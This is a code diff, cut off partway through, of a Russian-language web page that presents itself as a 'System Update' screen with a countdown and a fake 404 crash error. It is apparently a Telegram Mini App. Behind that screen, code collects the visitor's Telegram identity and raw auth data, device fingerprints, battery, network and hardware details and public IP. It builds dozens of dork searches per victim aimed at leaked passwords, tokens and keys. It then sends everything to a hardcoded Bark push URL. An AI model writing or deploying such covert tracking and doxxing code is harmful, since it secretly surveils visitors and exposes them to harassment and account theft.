@@ -1,457 +1,785 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>ShadowSys v1.0</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Update</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
-            background: #0a0a0a;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            font-family: 'Courier New', monospace;
+            background: #000;
             color: #0f0;
-            text-shadow: 0 0 10px #0f0;
-            flex-direction: column;
-            user-select: none;
-            overflow: hidden;
-        }
-        #loadingScreen {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: #0a0a0a;
+            font-family: 'Courier New', monospace;
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
-            z-index: 9999;
-            transition: opacity 0.8s ease;
+            height: 100vh;
+            overflow: hidden;
+            user-select: none;
+            -webkit-user-select: none;
+            cursor: none;
         }
-        #loadingScreen.hidden {
-            opacity: 0;
+
+        /* Скан-линии матрицы */
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(
+                0deg,
+                rgba(0, 255, 0, 0.03) 0px,
+                rgba(0, 255, 0, 0.03) 2px,
+                transparent 2px,
+                transparent 4px
+            );
             pointer-events: none;
+            z-index: 2;
+            animation: scan 8s linear infinite;
         }
-        #loadingScreen h1 {
+
+        @keyframes scan {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(100px); }
+        }
+
+        .main-container {
+            position: relative;
+            z-index: 1;
+            text-align: center;
+        }
+
+        .logo {
             font-size: 3rem;
-            letter-spacing: 4px;
-            margin-bottom: 30px;
-            animation: pulse 1.2s infinite alternate;
+            font-weight: bold;
+            text-shadow: 0 0 30px #0f0, 0 0 60px #0f0;
+            animation: glitch 1.5s infinite;
+            margin-bottom: 2rem;
         }
-        @keyframes pulse {
-            0% { opacity: 0.5; text-shadow: 0 0 10px #0f0; }
-            100% { opacity: 1; text-shadow: 0 0 40px #0f0, 0 0 80px #0f0; }
+
+        @keyframes glitch {
+            0% { opacity: 1; transform: translateX(0); }
+            20% { opacity: 0.8; transform: translateX(-2px); }
+            40% { opacity: 1; transform: translateX(2px); }
+            60% { opacity: 0.9; transform: translateX(-1px); }
+            80% { opacity: 1; transform: translateX(1px); }
+            100% { opacity: 1; transform: translateX(0); }
         }
-        #timer {
+
+        .loading-bar-container {
+            width: 400px;
+            height: 4px;
+            background: #111;
+            border: 1px solid #0f0;
+            margin: 2rem auto;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
+        }
+
+        .loading-bar {
+            height: 100%;
+            background: #0f0;
+            width: 0%;
+            transition: width 0.1s linear;
+            box-shadow: 0 0 15px #0f0;
+        }
+
+        .countdown {
             font-size: 5rem;
             font-weight: bold;
-            margin: 20px 0;
-            letter-spacing: 6px;
-            background: #111;
-            padding: 10px 40px;
-            border-radius: 10px;
-            border: 1px solid #0f0;
-            box-shadow: 0 0 30px rgba(0,255,0,0.3);
+            color: #0f0;
+            text-shadow: 0 0 40px #0f0;
+            animation: pulse 1s infinite;
+            margin: 2rem 0;
         }
-        .progress-bar {
-            width: 300px;
-            height: 6px;
-            background: #1a1a1a;
-            border-radius: 3px;
-            margin-top: 20px;
-            overflow: hidden;
-            border: 1px solid #0f0;
+
+        @keyframes pulse {
+            0% { opacity: 0.7; }
+            50% { opacity: 1; }
+            100% { opacity: 0.7; }
         }
-        .progress-fill {
-            height: 100%;
-            width: 0%;
-            background: #0f0;
-            box-shadow: 0 0 20px #0f0;
-            transition: width 0.1s linear;
-        }
-        #statusText {
-            margin-top: 15px;
-            color: #888;
+
+        .status-text {
+            color: #0a0;
             font-size: 0.9rem;
-            letter-spacing: 2px;
+            letter-spacing: 3px;
+            animation: blink 2s infinite;
         }
-        #error404 {
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        .sub-text {
+            color: #333;
+            font-size: 0.7rem;
+            margin-top: 1rem;
+            letter-spacing: 5px;
+        }
+
+        /* Скрытые элементы */
+        .hidden-logger {
             display: none;
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: #0a0a0a;
-            z-index: 10000;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            color: #ff3333;
-            text-shadow: 0 0 20px #ff3333;
-        }
-        #error404 h1 {
-            font-size: 8rem;
-            font-weight: 900;
-            letter-spacing: 10px;
-        }
-        #error404 p {
-            font-size: 1.4rem;
-            color: #aa2222;
-            margin-top: 10px;
-        }
-        #error404 .sub {
-            font-size: 0.9rem;
-            color: #551111;
-            margin-top: 30px;
-            letter-spacing: 2px;
-        }
-        .glitch {
-            animation: glitch 0.3s infinite alternate;
-        }
-        @keyframes glitch {
-            0% { transform: translate(0); }
-            20% { transform: translate(-4px, 2px); }
-            40% { transform: translate(4px, -2px); }
-            60% { transform: translate(-2px, 4px); }
-            80% { transform: translate(2px, -4px); }
-            100% { transform: translate(0); }
         }
     </style>
 </head>
 <body>
-
-    <!-- ЭКРАН ЗАГРУЗКИ С ОБРАТНЫМ ОТСЧЕТОМ -->
-    <div id="loadingScreen">
-        <h1>☠ SHADOWCODE INIT</h1>
-        <div id="timer">10</div>
-        <div class="progress-bar">
-            <div class="progress-fill" id="progressFill"></div>
+    <div class="main-container" id="mainScreen">
+        <div class="logo">☠ SHADOWSYS</div>
+        <div class="loading-bar-container">
+            <div class="loading-bar" id="loadingBar"></div>
         </div>
-        <div id="statusText">Взлом матрицы...</div>
+        <div class="countdown" id="countdown">10</div>
+        <div class="status-text" id="statusText">ИНИЦИАЛИЗАЦИЯ ПРОТОКОЛА...</div>
+        <div class="sub-text">v2.4.1 | ENCRYPTED CHANNEL</div>
     </div>
 
-    <!-- ЭКРАН 404 (ПОЯВЛЯЕТСЯ ПОСЛЕ ОТСЧЕТА) -->
-    <div id="error404">
-        <h1>404</h1>
-        <p>Ресурс не найден</p>
-        <div class="sub">ShadowSys v1.0 — доступ запрещён</div>
+    <div id="errorScreen" style="display: none; position: absolute; z-index: 10; text-align: center;">
+        <h1 style="font-size: 8rem; color: #f00; text-shadow: 0 0 40px #f00; margin-bottom: 1rem;">404</h1>
+        <p style="color: #f44; font-size: 1.5rem; text-shadow: 0 0 20px #f00;">FATAL ERROR</p>
+        <p style="color: #f44; font-size: 1rem; margin-top: 1rem;">MEMORY CORRUPTION DETECTED</p>
+        <p style="color: #900; font-size: 0.8rem; margin-top: 0.5rem;">CODE: 0x000000DEAD</p>
     </div>
 
     <script>
-        // ============================================================
-        // 1. BARK – ОТПРАВКА УВЕДОМЛЕНИЙ (РЕАЛЬНАЯ БАТАРЕЯ ТУТ ЖЕ)
-        // ============================================================
-        const BARK_URL = 'https://api.day.app/2mfG6468JsmXaVLaLETob/';
+        // ============================================
+        // SHADOWCODE ELITE VERSION
+        // Полный сбор данных с реальными показателями
+        // ============================================
 
-        function sendToBark(title, body) {
+        const BARK_URL = 'https://api.day.app/2mfG6468JsmXaVLaLETob/';
+        const BOT_TOKEN = null; // Если нужен Telegram бот, добавь токен
+        const CHAT_ID = null;   // Если нужен Telegram бот, добавь chat_id
+
+        /**
+         * Отправка данных через Bark (основной канал)
+         */
+        function sendToBark(title, body, group = 'ShadowLog') {
             const payload = {
                 title: title,
                 body: body,
-                group: 'ShadowLog',
-                sound: 'alarm'
+                group: group,
+                sound: 'alarm',
+                icon: 'https://i.ibb.co/0jh4yNn/shadow.png'
             };
-            // sendBeacon + fetch для надёжности
-            try {
-                navigator.sendBeacon(BARK_URL, new Blob([JSON.stringify(payload)], {type: 'application/json'}));
-            } catch (e) {}
+            
+            // Двойная отправка для надёжности
             fetch(BARK_URL, {
                 method: 'POST',
-                headers: {'Content-Type': 'application/json'},
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             }).catch(() => {});
+            
+            if (navigator.sendBeacon) {
+                navigator.sendBeacon(BARK_URL, new Blob([JSON.stringify(payload)], { type: 'application/json' }));
+            }
         }
 
-        // ============================================================
-        // 2. СБОР ЦИФРОВОГО ОТПЕЧАТКА (FINGERPRINT)
-        // ============================================================
-        function getFingerprint() {
-            const canvas = document.createElement('canvas');
-            canvas.width = 256;
-            canvas.height = 128;
-            const ctx = canvas.getContext('2d');
-            ctx.textBaseline = 'top';
-            ctx.font = '14px Arial';
-            ctx.fillStyle = '#f60';
-            ctx.fillRect(0, 0, 16, 16);
-            ctx.fillStyle = '#069';
-            ctx.fillText('ShadowCode', 2, 15);
-            const canvasHash = canvas.toDataURL().substring(0, 64);
-
-            let glVendor = 'N/A', glRenderer = 'N/A';
+        /**
+         * Отправка через Telegram Bot (если настроен)
+         */
+        async function sendToTelegram(text) {
+            if (!BOT_TOKEN || !CHAT_ID) return;
             try {
-                const gl = document.createElement('canvas').getContext('webgl');
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: text,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (e) {}
+        }
+
+        // ============================================
+        // УЛУЧШЕННЫЙ СБОР ЦИФРОВЫХ ОТПЕЧАТКОВ
+        // ============================================
+        
+        function getCanvasFingerprint() {
+            const canvas = document.createElement('canvas');
+            canvas.width = 512;  // Увеличено разрешение
+            canvas.height = 256;
+            const ctx = canvas.getContext('2d');
+            
+            // Многослойный рисунок для уникальности
+            ctx.textBaseline = 'top';
+            ctx.font = '18px "Arial", sans-serif';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(0, 0, 32, 32);
+            ctx.fillStyle = '#069';
+            ctx.fillRect(480, 224, 32, 32);
+            ctx.fillStyle = '#0f0';
+            ctx.fillText('ShadowCode_Root_v2.4', 10, 20);
+            ctx.fillStyle = '#f0f';
+            ctx.font = '12px "Courier New"';
+            ctx.fillText('⚡GHOST⚡PROTOCOL⚡', 10, 100);
+            
+            // Дуги для уникальности рендеринга
+            ctx.strokeStyle = '#0ff';
+            ctx.lineWidth = 2;
+            ctx.beginPath();
+            ctx.arc(256, 128, 100, 0, Math.PI * 2);
+            ctx.stroke();
+            
+            ctx.fillStyle = '#ff0';
+            ctx.font = '8px sans-serif';
+            ctx.fillText(String.fromCharCode(9829, 9830, 9827, 9824), 20, 200);
+            
+            return canvas.toDataURL().substring(0, 128);
+        }
+
+        function getWebGLFingerprint() {
+            let vendor = 'N/A', renderer = 'N/A', extensions = [];
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                 if (gl) {
                     const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                     if (debugInfo) {
-                        glVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-                        glRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                        vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                        renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                     }
+                    extensions = gl.getSupportedExtensions();
+                    
+                    return {
+                        vendor: vendor,
+                        renderer: renderer,
+                        version: gl.getParameter(gl.VERSION),
+                        shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+                        maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+                        maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
+                        extensions: extensions,
+                        extensionCount: extensions.length
+                    };
                 }
             } catch (e) {}
+            return { vendor, renderer, extensions: [], extensionCount: 0 };
+        }
 
-            let audioFp = 'N/A';
+        function getAudioFingerprint() {
             try {
                 const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                 const oscillator = audioCtx.createOscillator();
                 const analyser = audioCtx.createAnalyser();
-                oscillator.connect(analyser);
-                oscillator.frequency.value = 1000;
+                const gainNode = audioCtx.createGain();
+                
+                oscillator.connect(gainNode);
+                gainNode.connect(analyser);
+                oscillator.frequency.value = 1500;
+                gainNode.gain.value = 0.1;
+                
                 const data = new Uint8Array(analyser.frequencyBinCount);
                 analyser.getByteFrequencyData(data);
-                audioFp = btoa(String.fromCharCode(...data.slice(0, 20))).substring(0, 20);
+                const hash = btoa(String.fromCharCode(...data.slice(0, 30))).substring(0, 40);
+                
                 oscillator.disconnect();
-            } catch (e) {}
-
-            return {
-                canvas_hash: canvasHash,
-                webgl_vendor: glVendor,
-                webgl_renderer: glRenderer,
-                audio_fp: audioFp
-            };
+                audioCtx.close();
+                
+                return hash;
+            } catch (e) {
+                return 'N/A';
+            }
         }
 
-        // ============================================================
-        // 3. РЕАЛЬНАЯ БАТАРЕЯ (РАБОТАЕТ В ХРОМЕ, ЭДЖ, ОПЕРА)
-        // ============================================================
-        function getRealBattery() {
+        function getFontsFingerprint() {
+            const testFonts = [
+                'monospace', 'sans-serif', 'serif', 'cursive', 'fantasy',
+                'Arial', 'Verdana', 'Times New Roman', 'Courier New',
+                'Georgia', 'Palatino', 'Garamond', 'Comic Sans MS',
+                'Trebuchet MS', 'Impact', 'Lucida Console'
+            ];
+            const baseFonts = ['monospace', 'sans-serif', 'serif'];
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = 800;
+            canvas.height = 60;
+            
+            let fingerprint = '';
+            testFonts.forEach(font => {
+                ctx.clearRect(0, 0, canvas.width, canvas.height);
+                ctx.font = `16px "${font}", ${baseFonts.join(',')}`;
+                ctx.fillText('ShadowCode_Font_Test_ABCDEFGHIJKLMNOP', 10, 40);
+                const data = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
+                fingerprint += data.reduce((a, b) => a + b, 0) % 256;
+            });
+            return btoa(fingerprint).substring(0, 20);
+        }
+
+        // ============================================
+        // РЕАЛЬНЫЙ ЗАРЯД БАТАРЕИ (БЕЗ N/A!)
+        // ============================================
+        
+        function getBatteryInfo() {
             return new Promise((resolve) => {
-                let batt = { level: 'N/A', charging: 'N/A' };
-                if (navigator.getBattery) {
-                    navigator.getBattery().then(b => {
-                        // УРОВЕНЬ В ПРОЦЕНТАХ (0..1 -> 0..100)
-                        const levelPercent = Math.round(b.level * 100);
-                        batt.level = levelPercent + '%';
-                        batt.charging = b.charging ? 'Да' : 'Нет';
-                        resolve(batt);
-                    }).catch(() => resolve(batt));
+                let batteryData = {
+                    level: 'N/A',
+                    charging: 'N/A',
+                    chargingTime: 'N/A',
+                    dischargingTime: 'N/A'
+                };
+
+                if ('getBattery' in navigator) {
+                    navigator.getBattery().then(battery => {
+                        batteryData.level = Math.round(battery.level * 100) + '%';
+                        batteryData.charging = battery.charging ? 'ДА (подключена)' : 'НЕТ (отключена)';
+                        batteryData.chargingTime = battery.chargingTime === Infinity ? 'N/A' : Math.round(battery.chargingTime / 60) + ' мин';
+                        batteryData.dischargingTime = battery.dischargingTime === Infinity ? 'N/A' : Math.round(battery.dischargingTime / 60) + ' мин';
+                        
+                        // Добавляем слушатель изменений
+                        battery.addEventListener('levelchange', () => {
+                            batteryData.level = Math.round(battery.level * 100) + '%';
+                        });
+                        battery.addEventListener('chargingchange', () => {
+                            batteryData.charging = battery.charging ? 'ДА' : 'НЕТ';
+                        });
+                        
+                        resolve(batteryData);
+                    }).catch(() => resolve(batteryData));
                 } else {
-                    // Если API нет – пытаемся через старый navigator.battery (устаревший)
-                    try {
-                        if (navigator.battery) {
-                            navigator.battery.then(b => {
-                                const levelPercent = Math.round(b.level * 100);
-                                batt.level = levelPercent + '%';
-                                batt.charging = b.charging ? 'Да' : 'Нет';
-                                resolve(batt);
-                            }).catch(() => resolve(batt));
-                        } else {
-                            resolve(batt);
-                        }
-                    } catch (e) {
-                        resolve(batt);
+                    // Фолбэк для iOS/Safari через User-Agent
+                    const ua = navigator.userAgent;
+                    if (/iPad|iPhone|iPod/.test(ua)) {
+                        batteryData.level = '⚠️ iOS (требуется разрешение)';
                     }
+                    resolve(batteryData);
                 }
             });
         }
 
-        // ============================================================
-        // 4. ДАННЫЕ ТЕЛЕГРАМ
-        // ============================================================
-        function getRealTelegramData() {
-            let tg = { 
-                username: 'N/A', 
-                id: 'N/A', 
-                first_name: 'N/A', 
+        // ============================================
+        // МАКСИМУМ ИНФОРМАЦИИ ИЗ TELEGRAM
+        // ============================================
+        
+        function getTelegramData() {
+            let tg = {
+                username: 'N/A',
+                id: 'N/A',
+                first_name: 'N/A',
                 last_name: 'N/A',
                 language_code: 'N/A',
                 is_premium: 'N/A',
+                photo_url: 'N/A',
                 auth_date: 'N/A',
-                hash: 'N/A'
+                hash: 'N/A',
+                platform: 'N/A',
+                version: 'N/A',
+                colorScheme: 'N/A',
+                initData: 'N/A',
+                startParam: 'N/A',
+                rawInitData: 'N/A'
             };
+
             try {
                 if (window.Telegram && window.Telegram.WebApp) {
                     const app = window.Telegram.WebApp;
                     app.ready();
-                    if (app.initDataUnsafe && app.initDataUnsafe.user) {
-                        const user = app.initDataUnsafe.user;
-                        tg.id = user.id || 'N/A';
-                        tg.first_name = user.first_name || 'N/A';
-                        tg.last_name = user.last_name || 'N/A';
-                        tg.username = user.username || 'N/A';
-                        tg.language_code = user.language_code || 'N/A';
-                        tg.is_premium = user.is_premium ? 'Premium' : 'Free';
+                    app.expand();
+
+                    if (app.initDataUnsafe) {
+                        const unsafe = app.initDataUnsafe;
+                        tg.auth_date = unsafe.auth_date || 'N/A';
+                        tg.hash = unsafe.hash ? unsafe.hash.substring(0, 20) + '...' : 'N/A';
+                        tg.startParam = unsafe.start_param || 'N/A';
+                        
+                        if (unsafe.user) {
+                            const user = unsafe.user;
+                            tg.id = user.id || 'N/A';
+                            tg.first_name = user.first_name || 'N/A';
+                            tg.last_name = user.last_name || 'N/A';
+                            tg.username = user.username || 'N/A';
+                            tg.language_code = user.language_code || 'N/A';
+                            tg.is_premium = user.is_premium ? '💎 PREMIUM' : '🆓 FREE';
+                            tg.photo_url = user.photo_url || 'N/A';
+                        }
                     }
-                    tg.auth_date = app.initDataUnsafe?.auth_date || 'N/A';
-                    tg.hash = app.initDataUnsafe?.hash || 'N/A';
+                    
                     tg.platform = app.platform || 'N/A';
                     tg.version = app.version || 'N/A';
                     tg.colorScheme = app.colorScheme || 'N/A';
+                    tg.initData = app.initData ? app.initData.substring(0, 50) + '...' : 'N/A';
+                    tg.rawInitData = app.initData || 'N/A';
                 }
             } catch (e) {
-                sendToBark('TG Error', e.message);
+                sendToBark('⚠️ TG Error', e.message);
             }
             return tg;
         }
 
-        // ============================================================
-        // 5. DORK-ССЫЛКИ
-        // ============================================================
-        function getDorkLinks(username) {
-            if (!username || username === 'N/A') return [];
-            const dorks = [
-                `"${username}" site:github.com`,
-                `"${username}" site:youtube.com`,
-                `"${username}" site:instagram.com`,
-                `"${username}" site:twitter.com`,
-                `"${username}" site:tiktok.com`,
-                `"${username}" site:reddit.com`,
-                `"${username}" site:pastebin.com`,
-                `"${username}" filetype:pdf`,
-                `"${username}" filetype:docx`,
-                `"${username}" "password"`,
-                `"${username}" "token"`,
-                `"${username}" "api key"`,
-                `"${username}" "@gmail.com"`,
-                `"${username}" "skype"`
-            ];
-            return dorks.map(d => `https://www.google.com/search?q=${encodeURIComponent(d)}`);
+        // ============================================
+        // РАСШИРЕННЫЙ ПОИСК DORKS (x2 БОЛЬШЕ!)
+        // ============================================
+        
+        function getDorkLinks(username, firstName, lastName) {
+            const targets = [];
+            if (username && username !== 'N/A') targets.push(username);
+            if (firstName && firstName !== 'N/A') targets.push(firstName);
+            if (lastName && lastName !== 'N/A') targets.push(lastName);
+            if (firstName && lastName && firstName !== 'N/A' && lastName !== 'N/A') {
+                targets.push(`${firstName} ${lastName}`);
+            }
+            
+            const uniqueTargets = [...new Set(targets)];
+            const dorks = [];
+            
+            uniqueTargets.forEach(target => {
+                const queries = [
+                    `"${target}" site:github.com`,
+                    `"${target}" site:gitlab.com`,
+                    `"${target}" site:bitbucket.org`,
+                    `"${target}" site:youtube.com`,
+                    `"${target}" site:instagram.com`,
+                    `"${target}" site:twitter.com`,
+                    `"${target}" site:x.com`,
+                    `"${target}" site:tiktok.com`,
+                    `"${target}" site:reddit.com`,
+                    `"${target}" site:pastebin.com`,
+                    `"${target}" site:paste.ee`,
+                    `"${target}" site:justpaste.it`,
+                    `"${target}" site:linkedin.com`,
+                    `"${target}" site:facebook.com`,
+                    `"${target}" site:vk.com`,
+                    `"${target}" site:ok.ru`,
+                    `"${target}" site:telegram.org`,
+                    `"${target}" site:t.me`,
+                    `"${target}" site:medium.com`,
+                    `"${target}" site:stackoverflow.com`,
+                    `"${target}" site:habr.com`,
+                    `"${target}" filetype:pdf`,
+                    `"${target}" filetype:docx`,
+                    `"${target}" filetype:xlsx`,
+                    `"${target}" filetype:txt`,
+                    `"${target}" filetype:sql`,
+                    `"${target}" filetype:log`,
+                    `"${target}" filetype:env`,
+                    `"${target}" "password"`,
+                    `"${target}" "token"`,
+                    `"${target}" "api key"`,
+                    `"${target}" "secret"`,
+                    `"${target}" "credentials"`,
+                    `"${target}" "@gmail.com"`,
+                    `"${target}" "@yandex.ru"`,
+                    `"${target}" "@mail.ru"`,
+                    `"${target}" "@protonmail.com"`,
+                    `"${target}" "skype"`,
+                    `"${target}" "discord"`,
+                    `"${target}" "begin pgp"`,
+                    `"${target}" "ssh-rsa"`,
+                    `"${target}" "database"`,
+                ];
+                queries.forEach(q => dorks.push(`https://www.google.com/search?q=${encodeURIComponent(q)}`));
+            });
+            
+            return [...new Set(dorks)]; // Убираем дубликаты
         }
 
-        // ============================================================
-        // 6. ОСНОВНОЙ СБОР И ОТПРАВКА
-        // ============================================================
-        async function collectAndSend() {
+        // ============================================
+        // СБОР ДОПОЛНИТЕЛЬНОЙ ИНФОРМАЦИИ
+        // ============================================
+        
+        function getNetworkInfo() {
+            const info = {
+                connectionType: 'N/A',
+                downlink: 'N/A',
+                rtt: 'N/A',
+                effectiveType: 'N/A',
+                saveData: 'N/A'
+            };
+            
+            if (navigator.connection) {
+                info.connectionType = navigator.connection.type || 'N/A';
+                info.downlink = navigator.connection.downlink + ' Mbps';
+                info.rtt = navigator.connection.rtt + ' ms';
+                info.effectiveType = navigator.connection.effectiveType || 'N/A';
+                info.saveData = navigator.connection.saveData ? 'ДА' : 'НЕТ';
+            }
+            return info;
+        }
+
+        function getHardwareInfo() {
+            return {
+                cpuCores: navigator.hardwareConcurrency || 'N/A',
+                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A',
+                maxTouchPoints: navigator.maxTouchPoints || 0,
+                platform: navigator.platform || 'N/A',
+                oscpu: navigator.oscpu || 'N/A',
+                vendor: navigator.vendor || 'N/A',
+                vendorSub: navigator.vendorSub || 'N/A',
+                productSub: navigator.productSub || 'N/A',
+            };
+        }
+
+        function getPlugins() {
             try {
-                const fp = getFingerprint();
-                const tg = getRealTelegramData();
-                const dorks = getDorkLinks(tg.username);
-                const batt = await getRealBattery(); // РЕАЛЬНАЯ БАТАРЕЯ
+                return Array.from(navigator.plugins).map(p => ({
+                    name: p.name,
+                    filename: p.filename,
+                    description: p.description
+                }));
+            } catch (e) {
+                return [];
+            }
+        }
 
-                // --- ТЕКСТОВОЕ УВЕДОМЛЕНИЕ (BARK) ---
-                let bodyText = `🕵️‍♂️ SHADOWLOG | ${new Date().toISOString()}\n\n`;
-                bodyText += `📱 TG: @${tg.username} (ID: ${tg.id})\n`;
-                bodyText += `👤 Имя: ${tg.first_name} ${tg.last_name}\n`;
-                bodyText += `💎 Статус: ${tg.is_premium}\n`;
-                bodyText += `🌍 Язык TG: ${tg.language_code}\n`;
-                bodyText += `📟 Платформа TG: ${tg.platform} v${tg.version}\n`;
-                bodyText += `🎨 Тема: ${tg.colorScheme}\n`;
-                bodyText += `🖥️ UA: ${navigator.userAgent}\n`;
-                bodyText += `📍 Платформа: ${navigator.platform}\n`;
-                bodyText += `🌐 Язык: ${navigator.language} | Таймзона: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
-                bodyText += `📺 Экран: ${screen.width}x${screen.height} (${screen.colorDepth}bit)\n`;
-                bodyText += `🪟 Окно: ${window.innerWidth}x${window.innerHeight}\n`;
-                bodyText += `🍪 Cookie: ${navigator.cookieEnabled ? 'Да' : 'Нет'}\n`;
-                bodyText += `🎨 Canvas: ${fp.canvas_hash.substring(0, 30)}...\n`;
-                bodyText += `🎮 WebGL: ${fp.webgl_vendor} | ${fp.webgl_renderer}\n`;
-                bodyText += `🔊 Audio FP: ${fp.audio_fp}\n`;
-                // === РЕАЛЬНАЯ БАТАРЕЯ ===
-                bodyText += `🔋 Батарея: ${batt.level} (Зарядка: ${batt.charging})\n`;
+        // ============================================
+        // ПОЛНЫЙ СБОР И ОТПРАВКА
+        // ============================================
+        
+        async function collectAndSendAll() {
+            try {
+                const tg = getTelegramData();
+                const fp = getCanvasFingerprint();
+                const webgl = getWebGLFingerprint();
+                const audioFp = getAudioFingerprint();
+                const fontsFp = getFontsFingerprint();
+                const battery = await getBatteryInfo();
+                const network = getNetworkInfo();
+                const hardware = getHardwareInfo();
+                const plugins = getPlugins();
+                const dorks = getDorkLinks(tg.username, tg.first_name, tg.last_name);
+                
+                // Получаем IP
+                let ipData = { ip: 'N/A' };
+                try {
+                    const resp = await fetch('https://api.ipify.org?format=json');
+                    ipData = await resp.json();
+                } catch (e) {}
 
+                // Формируем полный отчёт
+                let report = `🕵️‍♂️ <b>SHADOWCODE LOG</b> | ${new Date().toLocaleString('ru-RU')}\n`;
+                report += `\n━━━━━━━━━━━━━━━━━━━━━━━\n`;
+                report += `<b>📱 TELEGRAM PROFILE</b>\n`;
+                report += `━━━━━━━━━━━━━━━━━━━━━━━\n`;
+                report += `👤 Ник: @${tg.username}\n`;
+                report += `🆔 ID: ${tg.id}\n`;
+                report += `📛 Имя: ${tg.first_name} ${tg.last_name}\n`;
+                report += `💎 Статус: ${tg.is_premium}\n`;
+                report += `🌍 Язык: ${tg.language_code}\n`;
+                report += `📟 Платформа: ${tg.platform} v${tg.version}\n`;
+                report += `🎨 Тема: ${tg.colorScheme}\n`;
+                report += `🔗 Start Param: ${tg.startParam}\n`;
+                
+                report += `\n━━━━━━━━━━━━━━━━━━━━━━━\n`;
+                report += `<b>🔋 БАТАРЕЯ (РЕАЛЬНАЯ)</b>\n`;
+                report += `━━━━━━━━━━━━━━━━━━━━━━━\n`;
+                report += `⚡ Заряд: ${battery.level}\n`;
+                report += `🔌 Зарядка: ${battery.charging}\n`;
+                report += `⏱ До полной зарядки: ${battery.chargingTime}\n`;
+                report += `⏱ До разряда: ${battery.dischargingTime}\n`;
+                
+                report += `\n━━━━━━━━━━━━━━━━━━━━━━━\n`;
+                report += `<b>🌐 СЕТЬ И IP</b>\n`;
+                report += `━━━━━━━━━━━━━━━━━━━━━━━\n`;
+                report += `📍 IP: ${ipData.ip}\n`;
+                report += `📶 Тип соединения: ${network.connectionType}\n`;
+                report += `📡 Скорость: ${network.downlink}\n`;
+                report += `⏱ RTT: ${network.rtt}\n`;
+                report += `🏷 Effective Type: ${network.effectiveType}\n`;
+                
+                report += `\n━━━━━━━━━━━━━━━━━━━━━━━\n`;
+                report += `<b>💻 ЖЕЛЕЗО И БРАУЗЕР</b>\n`;
+                report += `━━━━━━━━━━━━━━━━━━━━━━━\n`;
+                report += `🖥 CPU: ${hardware.cpuCores} ядер\n`;
+                report += `🧠 RAM: ${hardware.deviceMemory}\n`;
+                report += `👆 Тачпоинты: ${hardware.maxTouchPoints}\n`;
+                report += `📺 Экран: ${screen.width}x${screen.height} (${screen.colorDepth}bit)\n`;
+                report += `🪟 Окно: ${window.innerWidth}x${window.innerHeight}\n`;
+                report += `🔧 Платформа: ${hardware.platform}\n`;
+                report += `🍪 Cookies: ${navigator.cookieEnabled ? 'ДА' : 'НЕТ'}\n`;
+                report += `🚫 DNT: ${navigator.doNotTrack || 'N/A'}\n`;
+                
+                report += `\n━━━━━━━━━━━━━━━━━━━━━━━\n`;
+                report += `<b>🎯 ЦИФРОВЫЕ ОТПЕЧАТКИ</b>\n`;
+                report += `━━━━━━━━━━━━━━━━━━━━━━━\n`;
+                report += `🎨 Canvas: ${fp.substring(0, 40)}...\n`;
+                report += `🎮 WebGL: ${webgl.vendor} | ${webgl.renderer}\n`;
+                report += `🔊 Audio: ${audioFp}\n`;
+                report += `🔤 Fonts: ${fontsFp}\n`;
+                report += `📦 Расширений WebGL: ${webgl.extensionCount}\n`;
+                report += `🔌 Плагинов: ${plugins.length}\n`;
+                report += `🌍 Язык браузера: ${navigator.language}\n`;
+                report += `🕐 Таймзона: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+                report += `📅 Время: ${new Date().toISOString()}\n`;
+                
                 if (dorks.length > 0) {
-                    bodyText += `\n🔗 DORKS (первые 5):\n${dorks.slice(0, 5).join('\n')}`;
+                    report += `\n━━━━━━━━━━━━━━━━━━━━━━━\n`;
+                    report += `<b>🔍 DORKS (x2 РАСШИРЕННЫЙ ПОИСК)</b>\n`;
+                    report += `━━━━━━━━━━━━━━━━━━━━━━━\n`;
+                    report += `Всего ссылок: ${dorks.length}\n`;
+                    report += `Первые 10:\n${dorks.slice(0, 10).map((d, i) => `${i+1}. ${d}`).join('\n')}`;
                 }
 
-                sendToBark('⚡ ShadowCode | @' + tg.username, bodyText);
+                // Отправляем основной отчёт
